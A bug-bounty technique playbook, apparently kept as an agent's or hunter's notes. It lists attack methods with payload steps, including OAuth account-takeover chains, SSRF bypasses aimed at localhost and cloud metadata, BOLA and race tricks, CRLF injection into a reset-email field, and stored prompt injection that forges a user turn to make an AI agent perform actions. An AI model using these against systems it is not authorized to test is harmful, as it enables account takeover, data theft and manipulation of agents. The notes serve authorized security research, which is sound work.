techniques.tell: none in token_endpoint_auth_methods is legitimate for public clients ALONE, but becomes a chain when paired with open client registration - an attacker registers a client and immediately exchanges codes for it. Field note: we probed only openid-configuration on one hunt and would have missed the second document entirely

techniques.technique: OAUTH ATO CHAIN - four individually-weak findings compose into account takeover: (1) unauthenticated client registration accepting arbitrary redirect_uris, (2) an /authorize endpoint that answers without a session, (3) a token endpoint requiring no client secret, (4) wildcard CORS. Register a client pointed at your host, send the victim the consent link, take the code off your callback, exchange it
techniques.payload: POST /oauth/register with redirect_uris set to your host -> client_id | GET /oauth/authorize?client_id=yours&redirect_uri=yours&response_type=code -> victim approves -> code lands on your host | POST /oauth/token grant_type=authorization_code plus PKCE verifier, no secret -> access and refresh JWT
techniques.tell: a 201 returned by /authorize WITHOUT a session is the tell that authentication is missing rather than merely weak. Each finding alone grades low; the chain is a critical ATO. Always test registration UNAUTHENTICATED - our own probe on one target answered dynamic client registration is disabled, which is the correct answer and costs 30 seconds

techniques.technique: a bring-your-own-OAuth-provider feature is a sanctioned SSRF primitive: the app asks YOU for the Token URL, and its BACKEND sends a POST there during the code exchange. Point the Token URL at your listener, then at internal addresses
techniques.payload: add a custom OAuth server in the target integration settings | Authorization URL = a real working provider (Google Cloud Console issues one free) so the flow completes | Token URL = your collaborator, then http://127.0.0.1, then other internal hosts | click Sign In to trigger the backend fetch each time
techniques.tell: differing errors per port (ECONNREFUSED vs timeout) give internal port state. The Authorization URL must be a REAL provider or the flow never reaches step 4 and the Token URL is never fetched - that is the control most people miss. Hunt this wherever a product lets a tenant configure its own IdP, webhook or integration endpoint
techniques.ref: Ahmed Fadel - SSRF in OAuth client implementation, 2024-12

techniques.technique: SCOPE UPGRADE AT THE TOKEN STEP, not the authorize step. The user consents to a narrow scope at /authorize, but the client controls the /token request - append extra scopes there and see whether the issued token carries them. Same trick on the implicit flow by adding a scope parameter to the /userinfo call
techniques.payload: consent to openid email, then POST /token grant_type=authorization_code with scope=openid email profile - decode the returned token scope claim and compare against what was consented
techniques.tell: the consent screen and the token issuance are two different enforcement points and only the second one matters. Distinct from client_credentials scope escalation which we HAVE tested - this one rides a real user approval, so the resulting token is bound to the victim rather than to a machine client

techniques.technique: IDENTITY-WITHOUT-PROOF at the social-login callback: strip the request that follows a successful provider login down to its minimum and see what the server actually verifies. If a bare provider user id (facebook oauthId, google sub) issues a session, then anyone holding that id logs in as the victim - and those ids are often public
techniques.payload: POST /api/login with loginType, oauthId, email, name - remove email, then name, then everything except the id, and observe which removal finally breaks it
techniques.tell: if only the id is required then no token is being validated at all. Related: a provider that lets you register WITHOUT verifying the email lets you pre-claim a victim address and then sign in as them at any client trusting that provider email claim. Both are a single request to test after any social login
techniques.ref: Complete OAuth Methodology + Shahzaib Part II

techniques.technique: when an object id is REJECTED, change its TYPE rather than its value: wrap it in an array, wrap it in an object, duplicate the parameter in query string or JSON body, or send a wildcard. The authorization check and the data lookup often parse the request with different libraries and disagree about which occurrence wins
techniques.payload: id 111 becomes id [111] | id becomes a nested object holding id | ?user_id=mine&user_id=victim AND the reverse order | JSON body with the key twice, both orders | id=* | swap a GUID or email for a small integer
techniques.tell: parameter ORDER matters so always send both orderings - the check may read the first while the query reads the last. A 403 on one id is not a verdict: try 20 more, partial authorisation is real. Highest-yield ids live in HEADERS and BODIES rather than URLs, and in the most niche feature in the app where nobody thought about authz
techniques.ref: Inon Shkedy - Deep dive on BOLA

techniques.technique: SESSION LABEL SWAPPING - the systematic BOLA test. Keep two accounts session labels (cookie, bearer, whatever identifies the caller) in a file, capture a request from A carrying an object id, then replay it with B label ONLY. Identical bodies means vulnerable, an authorization error means enforced
techniques.payload: log A label and B label | intercept A request to a resource with an id | resend with B label, everything else byte-identical | diff the two responses
techniques.tell: vary the CREDENTIAL not the id - one variable moves and no id guessing is needed. Endpoints returning only a status code (DELETE, PUT) still count: verdict on the OBJECT STATE afterwards, never the response. Contrast with the reverse test (own credential, foreign id) which needs a valid foreign id you may not be able to obtain
techniques.ref: Inon Shkedy - Deep dive on BOLA

techniques.technique: SINGLE-PACKET ATTACK - the reliable way to race. Queue N copies of the request over one HTTP/2 connection with the final frame of each withheld, then release all final frames together so every request arrives in ONE TCP packet. Network jitter, the usual reason races fail to reproduce, is eliminated. On HTTP/1.1 the equivalent is last-byte synchronisation over a kept-open connection
techniques.payload: Turbo Intruder: RequestEngine(endpoint=target.endpoint, concurrentConnections=10, engine=Engine.BURP2) then queue with gate='race1' in a loop and call engine.openGate('race1'). HTTP/1 only: Engine.THREADED
techniques.tell: a NEGATIVE timestamp in the results means the server answered before the request finished - the gate did not hold and the run is void. Race findings need a SEQUENTIAL control proving the limit works normally, otherwise you have not shown a race, only a working feature
techniques.ref: race condition guide + PortSwigger single-packet attack

techniques.technique: RACE THE INVITE AND MEMBERSHIP ENDPOINTS, not just payment. Four disclosed reports all hit non-financial counters: the same member invited N times to one team, a CTF flag submitted N times for N times the points, a retest confirmed N times for N payouts, and a user joining a group twice so that neither they nor the admin can ever remove them
techniques.payload: parallel-fire the COMMIT step of: invite member, accept invitation, join group, submit code, redeem coupon, claim reward, confirm payout. Then read the resulting LIST or COUNTER, not the responses
techniques.tell: the undeletable-group-member case is the sharpest: a duplicate row in a join table makes deletion permanently fail, so the damage is durable rather than momentary and needs no money to demonstrate. Look for any check-then-insert on a membership table. Note some programmes explicitly EXCLUDE races that bypass limits - read the brief before spending an hour here
techniques.ref: Omise invite race; H1 retest, flag-submission and group-member races

techniques.technique: PASSWORD-RESET EMAIL FIELD IS A MULTI-VALUE INJECTION POINT. The address that receives the reset link is chosen from a field you control - try to make the server accept two recipients at once: parameter pollution, an ARRAY in the JSON body, CRLF into an added cc header, or plain separators
techniques.payload: email=victim&email=attacker | JSON body with email as an array holding both addresses | email=victim%0a%0dcc:attacker | email=victim,attacker and the same with a pipe or a space separator
techniques.tell: the array form is the one most often forgotten because a JSON schema that types the field as string may still be handed to a mailer that accepts a list. Only the INBOX settles this class - a 200 proves nothing about which address received the link. Pair with checking whether the reset link is single-use, and whether the token is derived from guessable material such as a timestamp plus the email

techniques.technique: HUNT FEATURES MID-ROLLOUT. A staged or partial feature release is the least-reviewed code in the product - the H1 skills feature leaked other researchers report titles while enabled for roughly 20 users. Watch changelogs, beta flags, feature toggles and endpoints that appear for some accounts and not others
techniques.payload: diff the SPA bundle and the API surface between two accounts on different tiers or cohorts | look for BETA and NEW badges in the dashboard | check changelog and release notes for anything shipped in the last few weeks
techniques.tell: pairs with the discovery-rate rule - a brand-new feature inside an OLD, heavily-hunted programme is the rare combination of high traffic and low prior art. Also the inverse of chasing a new PROGRAMME, which is the most crowded thing on the platform

techniques.technique: STORED PROMPT INJECTION VIA A FIELD THE AGENT LATER READS. Do not inject into the chat - inject into content the agent will fetch on someone else behalf (a product review, a ticket body, a profile field), then ask the agent to summarise that content. First enumerate what the agent can DO by asking it which API functions it holds
techniques.payload: ask the assistant what api access do you have to enumerate its tools | submit a review ending with fake delimiters that close the surrounding JSON, then a forged USER RESPONSE block instructing a state-changing call | trigger the agent to read that content
techniques.tell: impact is cross-user because the payload is stored: every user who asks about that object executes it. The delimiters must match the real serialisation, so read the chat transport format first. Distinguish sharply from self-injection in your own chat window, which is worthless - the finding is that ANOTHER user triggers it

techniques.technique: COMPARE SIBLING METHODS IN THE SAME CONTROLLER - the vulnerable one is usually next to a correct one. In the Nextcloud out-of-office bug, setOutOfOffice reads the user from the SESSION while getOutOfOffice takes the user from a PATH PARAMETER, in the same file, both marked as needing no admin
techniques.payload: for any controller with a finding, read every sibling method: which take the actor from the session and which take it from the request? The mismatch is the bug. In source, grep the annotation that marks an endpoint as low-privilege and list all of them
techniques.tell: the READ path is the usual offender because the WRITE path was written first and correctly - authors bind the writer to the session, then add a getter that trusts its argument. This is the source-level form of the invariant-neighbourhood sweep and applies to any open-source or leaked-bundle target

techniques.technique: A 405 IS NEVER ENFORCEMENT - read the Allow header before you pick a verb. Testing whether a nested object id was bound to its parent, PUT returned 405 and the object was unchanged; that reads like a rejected write, but the request never reached an authz check at all. The 405 carried 'Allow: DELETE,GET,OPTIONS,PATCH' - PATCH was the real update verb, and only PATCH produced an interpretable answer
techniques.payload: send one deliberately wrong verb to the target path FIRST and read the Allow response header - it names the whole verb set for free, no bundle mining. On same-origin fetch every header is readable: r.headers.get('allow'). Then run the control with a verb that is actually in the set
techniques.tell: 405 and 403 and 400 all leave the object unchanged, so 'nothing happened' cannot distinguish a blocked write from an unrouted one. Same family as the benign-control rule: an unchanged object means something only after you have shown the verb CAN change it
techniques.ref: own hunt - managed-database console, nested object ids

techniques.technique: TEST ID BINDING WITH TWO OBJECTS YOU OWN, NOT TWO TENANTS. A nested id (/parent/{p}/child/{id}) raises one question: is the child scoped to the parent in the path, or looked up globally? No second account is needed - create a SECOND parent in your OWN project and try the first parent's child id through it. Same user, same tenant, only the parent segment differs
techniques.payload: create parent A and parent B under one account. Create child X under A, capture its id. Run GET/PATCH/DELETE on {B}/child/{X}, each with a passing control on {A}/child/{X}. If B resolves X, the id is global and the cross-tenant case follows without ever touching a foreign object
techniques.tell: cheaper, faster and safer than a cross-tenant rig - no second signup, no risk of touching data you do not own, and it isolates ONE variable (the parent segment) instead of changing account, token and parent at once. If binding holds here it holds cross-tenant, so it also closes the lane fast on a clean target
techniques.ref: own hunt - managed-database console, nested object ids

techniques.technique: WALK THE SCHEMA OFF THE VALIDATOR - POST an empty body and let the 400 name the next required field, add it, repeat. A console query editor gave up its whole create shape this way: {} -> "'name' is a required property" -> {name} -> "'database' is a required property" -> {name,query,database} -> 200. The same walk exposed an undocumented AI endpoint's required field with no bundle reading at all
techniques.payload: loop: send body, regex the response for "'([^']+)' is a required property", add that key with a dummy string, resend, stop on 2xx or when no new key appears. Catch type errors too ("is not of type 'array'") and coerce. Twelve iterations covers almost any endpoint
techniques.tell: a strict schema validator is a defence against mass assignment but also a free API doc - each rejection is one bit of the shape. Fastest input inventory on an endpoint whose bundle you cannot read, and it satisfies the write-body inventory rule before any injection verdict
techniques.ref: own hunt - managed-database console, schema discovery

techniques.technique: A CONNECTION PARAMETER IS NOT AN INJECTION POINT, AND THE DRIVER'S OWN ERROR TELLS YOU WHICH IT IS. Marker zz'\"--/* sent as the `database` selector came back as: FATAL: database "zz'\"--/*" does not exist. The whole marker returned as ONE QUOTED IDENTIFIER, so it was passed to libpq as a connection field, never concatenated into SQL text
techniques.payload: send a marker mixing ' and \" and -- and /* into every selector-style field (database, schema, table, collection). Read the error for HOW the value comes back: wrapped in quotes as a single name = parameterised; split, truncated at the quote, or a syntax-error near your marker = concatenation
techniques.tell: faster and far more certain than boolean/time-based probing, and it works on the first request. Also inverts a habit: the verbose error here is the EVIDENCE OF SAFETY, not the finding. Do not file the leaked internal path as a bug when it is the thing proving the field is handled correctly
techniques.ref: own hunt - managed-database console, metadata selectors

techniques.technique: SQL EXECUTION IS NOT SQL INJECTION WHEN THE PRODUCT IS A SQL CONSOLE. A managed-database console hands you a query editor AND superuser credentials on your own instance. Injecting SQL into a database where you already hold superuser crosses no boundary - there is no privilege to gain. The class is N/A ON IMPACT, and the vendor's brief usually says so outright
techniques.payload: before building any injection rig on a database product, ask: what does my existing credential already permit on this object? If the answer is everything, the only bug-shaped question left is whether the SAME endpoints reach an instance you do NOT own - test cross-service and cross-project id binding instead, and close the class there
techniques.tell: stops the single biggest time sink on database SaaS. N/A here is defensible because you can name WHY no boundary exists, which is categorically different from 'we did not test it'. Pairs with the coverage rule: N/A needs a reason, never a shrug
techniques.ref: own hunt - managed-database console, class 3 verdict

techniques.technique: A CLIENT-SUPPLIED chat_history IS NOT A BUG WITHOUT A CROSS-USER SINK. An AI console endpoint accepted chat_history as a caller-controlled array, so the caller can forge the assistant's own prior turns - the textbook prompt-injection primitive. It is still nothing: the conversation is self-directed and never rendered to any other user
techniques.payload: for any LLM endpoint, do not stop at 'the model can be steered'. Ask the sink question: whose screen does the output reach? Test whether the conversation is persisted, shared, replayed to an admin/support view, or fed to a downstream automated action. No second reader and no privileged action = no finding, regardless of how cleanly the model is manipulated
techniques.tell: prompt-injecting your own session is self-harm, not a vulnerability, and reports of it are exactly the AI-slop class programmes now ban researchers for. The sink question is what separates a real LLM finding from the commodity one everybody files
techniques.ref: own hunt - console AI chat endpoint

techniques.technique: OPENNESS IS AN ANTI-SIGNAL FOR CROWDING, NOT A MOAT. An open-source, self-hostable target was picked BECAUSE it had no gates - no signup, no bot wall, no paywall, and readable source. Its brief then showed 743 researchers joined, twelve times the count on a gated retail programme screened the same day, and the lowest realised payout of the batch. No barrier for you is no barrier for anyone, and source everyone CAN read is source everyone HAS read
techniques.payload: read the joined-researcher count and the realised average payout together, before any scope analysis. A target that is trivially easy to start on is a target thousands have already started on. Weight friction POSITIVELY: a paywall, a manual approval, a licence or a hardware requirement each subtract competitors, and if you can clear it you own that surface
techniques.tell: inverts the instinct that easy access is good. The right frame is cost-to-enter versus payout: high friction plus a way through is the actual moat. Same family as a public artefact never being the edge - if the door is open, the room is full
techniques.ref: own screen - OSS collaboration platform vs gated retail programme

techniques.technique: GREP THE OUT-OF-SCOPE LIST FOR YOUR OWN PROVEN CLASSES BEFORE RANKING A TARGET. Two programmes screened on the same day both excluded the limit-bypass and tier-bypass lanes BY NAME - one wrote 'race conditions that lead to bypassing the limit' straight into its known-issues list, the other spelled out 'upgrading tier without payment via API requests, using a discovered coupon code, extending the free trial'. Those are the exact two classes that had produced every self-found bug to date
techniques.payload: before reading targets, assets or reward tables, search the brief's exclusions and known-issues sections for the classes YOU actually land. Also flag catch-all clauses like 'reports where a configuration option is available to mitigate the finding' - wide enough to close a whole permission-model finding after you have done the work
techniques.tell: a scope gate is cheaper to check than any technical gate and it invalidates the entire target, not one lane. Doing it after the economics analysis means the ranking was built on a lane that cannot be filed. Structural gates beat exploit rigs, applied to programme selection rather than to an endpoint
techniques.ref: own screen - two briefs, same excluded lanes

techniques.technique: A MANDATED UA MARKER DOES NOT KILL CONSOLE BATCHING - override the User-Agent at TAB level, not in the fetch. Three programmes require a marker appended to User-Agent ('-MMS-BugBounty', 'BugBounty', a hunter handle). fetch() cannot set it because User-Agent is a forbidden header IN SCRIPT, but Chrome DevTools > More tools > Network conditions > User agent > untick 'Use browser default' sets it at the network layer for the whole tab, and every request from that tab - fetch() included - then carries it
techniques.payload: read navigator.userAgent, append the required marker, paste the full string into Network conditions, then send ONE fetch and confirm the marker appears in the outgoing request's User-Agent before testing anything real. Keep DevTools OPEN - the override dies when it closes and the tab silently reverts to unmarked traffic. If only a custom header is mandated (X-Bug-Bounty style) no override is needed at all
techniques.tell: this is the browser's own setting, not a bypass, so the batch is in policy from the first request. Testing unmarked and 'redoing it properly' after a hit risks the eligibility clause every such brief carries - the marker is how their SOC tells you from a real attacker. CORRECTS the first version of this entry, which claimed fetch 'physically cannot comply' - true of the call, false of the tab

techniques.technique: STACKED REWARD DECAY MAKES THE COMMODITY BUG WORTHLESS - price it before you hunt it. One brief combined OneFixOneReward (the same weakness across eleven country storefronts sharing a codebase pays ONCE, the rest close Informative) with a systemic-issue ladder (3rd similar report 75%, 4th 50%, 5th 25%, 6th and beyond 10%). A class that everybody finds therefore pays a tenth of grid
techniques.payload: before picking a lane, find the brief's duplicate-decay and one-fix clauses and multiply them against the grid. A EUR2,500 High that is the 6th report of its kind is EUR250. Then rank lanes by how few hunters can reach them, not by the grid number
techniques.tell: this is rank-by-discovery-rate expressed in the programme's own arithmetic - they have written down exactly how little they will pay for the obvious finding. It also warns against the multi-locale illusion: eleven storefronts is one target, not eleven, whenever the code is shared

techniques.technique: SEVEN-CHECK SSRF FILTER MATRIX, taken from a CORRECT implementation and used backwards. A well-written public validator rejects: (1) substring host matching - it parses and uses hostname, killing evil-lookalikes like x.com.evil.test; (2) userinfo - username/password present at all, killing the userinfo form where the real host follows an at-sign; (3) malformed authority - it touches parsed.port purely to force a ValueError on out-of-range ports; (4) LEGACY IPv4 SPELLINGS via socket.inet_aton, catching 2130706433 and 0177.0.0.1; (5) non-global literals via ip_address().is_global; (6) cloud metadata names by explicit blocklist (metadata.google.internal, instance-data); (7) percent-encoding in the host
techniques.payload: for any target's SSRF/webhook/URL field, walk these seven in order and find the one they did NOT implement. Reading a CORRECT filter is the cheapest way to enumerate the bypasses - the checks a careful author wrote down are exactly the tricks that work on authors who did not
techniques.tell: most real filters implement two or three of the seven. Rank the untested ones by how obscure they are: legacy IPv4 spellings and userinfo are the two most often missed, because a naive regex-based validator never parses the authority at all
techniques.ref: reference implementation read from a public agent repo

techniques.technique: A FILTER THAT VALIDATES THE STRING BUT NEVER RESOLVES IT IS CHECKING SPELLING, NOT DESTINATION. A carefully written public SSRF validator - parsing structurally, rejecting userinfo, catching legacy IPv4 spellings, testing is_global - performs NO DNS resolution at all. It only inspects LITERAL addresses, so any hostname that resolves to 127.0.0.1 or 169.254.169.254 passes every single check it makes
techniques.payload: give the validator the SAME address twice: once as a literal (expect a reject) and once as a hostname that resolves to it (nip.io, localtest.me, or your own A record). A reject-then-accept pair proves the filter stops at the parse. Then confirm DELIVERY actually dials it - a never-resolvable control separates a real connection attempt from a blocklist
techniques.tell: this is exactly the Auth0 finding, and seeing the same gap in an implementation written by someone who clearly knew the class says it is structural, not sloppiness: resolving costs a DNS round trip on every call and invites TOCTOU, so authors skip it. Check it FIRST on any URL-accepting field
techniques.ref: cross-checked against our own filed SSRF finding

techniques.technique: READ THE TESTS, NOT THE README - a repo's real contract is in its test names. Reviewing a public agent repo I read the README, grepped my red lines, saw a social-media reader and reported a complete evaluation. A second reader opened the test directory and found 30 files encoding boundaries the README never mentions: doctor must not start a credential-backed CLI, must not refresh a session, must report a STALE credential without refreshing it; private writes are 0600, atomic with rollback, and refuse a symlink at target, parent AND ancestor
techniques.payload: on any repo evaluation, list tests/ FIRST and read the test NAMES before any source. `grep -n '^def test' tests/*.py` gives the authors' own statement of what must never happen. Then read the modules those tests guard - that is where the load-bearing logic lives
techniques.tell: a README states intent, a test states a guarantee someone was willing to break the build over. This is the same error as ranking writeups by title: I judged by the surface and reported the judgement as a full read. Feature surface answers 'what is this for'; tests answer 'what does it promise'
techniques.ref: own miss, caught by a second reader

techniques.technique: EXTENDED SSRF MATRIX - seven more checks, read off a filter that is stronger than the last one. Beyond the original seven (pb0693), a well-built validator also blocks: IPv4-MAPPED IPv6 (the ::ffff:127.0.0.1 and ::ffff:169.254.169.254 forms), IPv4-COMPATIBLE IPv6 (the deprecated ::127.0.0.1 form), 0.0.0.0/8 which routes to localhost on Linux, the unspecified addresses, multicast 224.0.0.0/4 and broadcast 255.255.255.255/32, Alibaba metadata at 100.100.100.200 alongside the AWS and Google endpoints - AND it actually RESOLVES the hostname, checking every address getaddrinfo returns
techniques.payload: walk all fourteen against any URL-accepting field. The IPv6 embedding forms are the highest-yield untested ones because a validator built on an IPv4 blocklist never normalises them: ::ffff:169.254.169.254 reaches metadata on a filter that blocks the bare literal
techniques.tell: a filter that resolves DNS is a different and much better class than one that only inspects the literal - it closes the hostname bypass. Score the target on WHICH tier it implements: literal-only (weak, use a resolving hostname), resolving (strong, go to pb0697 instead)
techniques.ref: second reference implementation, richer than the first

techniques.technique: THE TWO HOLES EVEN A RESOLVING SSRF FILTER LEAVES: REDIRECTS AND TOCTOU. Two independent reference implementations, one of them resolving DNS and checking every returned address, both validate the INITIAL url only and neither pins the address they approved. So (a) a 302/307 to an internal address after the check passes is never re-validated, and (b) the caller resolves AGAIN at fetch time, so a DNS answer that changes between check and fetch reaches the internal target - classic rebinding. One also fails OPEN on resolution failure, asserted by its own test
techniques.payload: test redirects FIRST on any filter that survives the literal and hostname probes - host a 302 to the internal target on a domain that resolves publicly. For TOCTOU, a short-TTL record answering public then internal. Also try a name that fails to resolve: fail-open on gaierror means an unresolvable host skips the check entirely
techniques.tell: the redirect hole is the SAME bypass that carried our own filed SSRF (307 preserves POST) and it survives in code written by people who clearly knew the class - because validating the redirect chain means hooking the HTTP client, not the URL parser, and that is a different layer. Check the layer, not just the function
techniques.ref: two reference implementations, cross-checked against our filed finding

techniques.technique: VARIANT-ANALYSIS LADDER - when one bug is confirmed, pick the RIGHT breadth of detector, in this order: (1) VARIANT DETECTOR, source-to-sink or missing-guard across the whole bug family; (2) SCOPED BEHAVIOURAL REGRESSION, anchored on the affected API or trust boundary; (3) EXACT REGRESSION CANARY for the original shape, when broader variants would be too noisy; (4) NO DETECTOR AT ALL, when runtime state, product policy or external data is needed to tell vulnerable from safe. Step 4 is the one everybody skips
techniques.payload: after any confirmed source-level finding, try the family-wide detector first and only narrow when it drowns in false positives. Quality contract: the rule must FIRE on the vulnerable code and must be SILENT on the fixed code where a fix exists - validate against vulnerable, fixed and current trees before trusting it
techniques.tell: the silent-on-fixed half is the benign control applied to static analysis: a detector that never goes quiet proves nothing, exactly like a control that never passes. This is the practical form of the neighbourhood sweep for the WordPress and npm source-audit lane, where one confirmed pattern usually has siblings
techniques.ref: rule-lifecycle doc from a large OSS product's shipped rulepack

techniques.technique: PROBE THE RATE LIMIT WITH ONE REQUEST BEFORE DESIGNING A BATCH - on a registration or auth endpoint the limit is a COOLDOWN, not a rate. A ten-probe batch at 2s spacing got two requests through and then 429; a follow-up batch at 20s spacing - ten times slower - got 429 on all three, proving the penalty was a block earned earlier, not a per-second ceiling. The endpoint was then unusable and the fix under test could not be evaluated at all
techniques.payload: send ONE request. Read it. Send a second after 10s and compare. Only then choose a batch size, and keep auth/registration batches to 3-4 requests with 30s+ spacing. If a 429 arrives, STOP COMPLETELY - every further request extends the window and produces no data
techniques.tell: this is scaling before the control is established, in a new costume: I had the discipline for response semantics and none for request budget. On registration, signup and OTP endpoints the budget IS the experiment - burn it and the hypotheses stay untested no matter how good they were. Also note the 429 body was an HTML error page, not JSON: a batch that only parses JSON will silently mis-read the block as a malformed response

techniques.technique: THE PERSISTED-QUERY MANIFEST IS THE GRAPHQL ROUTE TABLE, AND IT SHIPS IN THE BUNDLE. A client identifying itself as `pwa-client-pqm` sent only sha256 hashes, never query text - which looks like a closed surface. The bundle carried the whole registry inline as [{"id":"<sha256>","name":"<OperationName>"}] - 313 operations, 56 of them money, loyalty or entitlement related, including SetPaymentStatus, SetPaymentStatusFallback, AddCoupon, GetPointsBalance and UpgradeLoyaltyTermsVersion
techniques.payload: grep the JS bundles for the sha256 of any operation you captured, then widen to the surrounding array: `\{"id":"[0-9a-f]{64}","name":"[A-Za-z0-9_]+"\}`. That yields the complete operation list without a single request to the target, and without introspection - which many programmes list as non-qualifying anyway
techniques.tell: APQ looks like it hides the API and instead hands you a cleaner route table than introspection would: names only, no noise, and the money operations are obvious from the names alone. Replaying a manifest hash needs the SAME client name AND version headers - the registry is keyed on both, and omitting the version returns PersistedQueryNotFound, which is easily misread as an allowlist rejection

techniques.technique: PASSIVE EXTRACTION BEATS ACTIVE PROBING ON EVERY AXIS THAT MATTERS. In one day: reading a JS bundle yielded a 313-operation GraphQL route table for ZERO requests, while a ten-probe batch against a registration endpoint burned the request budget in ninety seconds and earned a cooldown that left twenty-six hypotheses untestable. Same target, same hour, opposite outcomes
techniques.payload: before sending anything, exhaust what the client already told you: JS bundles for route tables and persisted-query manifests, `.js.map` sourcemaps for original unminified source with internal routes, the HAR's own write bodies for the input inventory, and any shipped Postman/OpenAPI collection. Only then spend requests, and spend them on ONE hypothesis at a time
techniques.tell: three independent pressures point the same way: every serious brief forbids automated scanning, active probes hit the commodity surfaces where duplicates live, and rate limits are enforced hardest on exactly the auth and registration endpoints worth testing. Passive reading is unlimited, unrestricted and undetectable - it is the only part of the hunt with no budget
techniques.ref: own hunt - one day, both outcomes

techniques.technique: READ YOUR OWN CODE BEFORE DECLARING SOMETHING UNBUILT. I named an OOB-confirmation capability 'the one earned UNBUILT thing' and scheduled it as the next build. It was already written and wired: a 76-line module with mint()/poll(), two agent methods, and an action-router entry. The real gap was ONE LINE - the listener bound 127.0.0.1, so it could never catch a callback from a remote target, which is why we had hand-rolled an external worker instead
techniques.payload: before any build decision, grep for the capability's own name across the codebase and read what turns up. Then ask the sharper question: not 'does it exist' but 'what is the one line that stops the existing thing from working in the real case?' Ninety percent of an earned build is often already sitting there, disabled by a default
techniques.tell: the same failure as trusting a memory file over the artefact - I planned from what I remembered instead of what was on disk. And the corrected build is an order of magnitude smaller: an adapter behind an existing interface, not a feature. An external code reviewer caught this before I did, which is the strongest argument for pointing something at your own repo
techniques.ref: own error - caught by an external code review
